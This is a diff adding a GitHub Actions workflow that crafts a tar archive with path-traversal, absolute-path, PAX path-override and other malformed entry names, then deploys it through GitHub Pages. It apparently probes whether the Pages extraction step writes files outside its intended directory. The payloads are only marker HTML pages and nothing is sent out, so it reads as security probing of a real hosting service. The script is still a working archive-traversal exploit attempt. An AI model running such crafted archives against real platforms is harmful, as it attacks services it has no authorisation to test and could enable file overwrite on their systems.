@@ -1,0 +1,49 @@
+name: Crafted tar probe 2 (no symlinks)
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Craft tar with traversal, absolute, pax-override entries
+        run: |
+          python3 - <<'PY'
+          import tarfile, time, io
+          ts = int(time.time())
+          t = tarfile.open('artifact.tar', 'w', format=tarfile.PAX_FORMAT)
+          def addfile(name, data=b'', pax=None):
+              ti = tarfile.TarInfo(name)
+              ti.size = len(data)
+              ti.mode = 0o644
+              if pax:
+                  ti.pax_headers = pax
+              t.addfile(ti, io.BytesIO(data))
+          addfile('index.html', b'<!DOCTYPE html><html><body><h1>craft2 deployed</h1></body></html>\n')
+          addfile('result2-marker.html', ('<!DOCTYPE html><h1>MARKER2-%d</h1>' % ts).encode())
+          addfile('/abs2-%d.html' % ts, ('<!DOCTYPE html><h1>ABS-%d</h1>' % ts).encode())
+          addfile('trav2/../../observable-trav2-%d.html' % ts, ('<!DOCTYPE html><h1>TRAV-%d</h1>' % ts).encode())
+          addfile('a/b/../../../norm-trav-%d.html' % ts, ('<!DOCTYPE html><h1>NORMTRAV-%d</h1>' % ts).encode())
+          addfile('./dot-prefix-%d.html' % ts, b'<!DOCTYPE html><h1>DOT</h1>')
+          addfile('benign-looking-%d.html' % ts, ('<!DOCTYPE html><h1>PAXOVERRIDE-%d</h1>' % ts).encode(), pax={'path': 'pax-override-marker-%d.html' % ts})
+          addfile('.../triple-dot-%d.html' % ts, b'<!DOCTYPE html><h1>TRIPLEDOT</h1>')
+          addfile('de/ep/../../../../up-four-%d.html' % ts, ('<!DOCTYPE html><h1>UP4-%d</h1>' % ts).encode())
+          t.close()
+          open('ts.txt','w').write(str(ts))
+          PY
+          cat ts.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - uses: actions/deploy-pages@v4
+        id: deployment
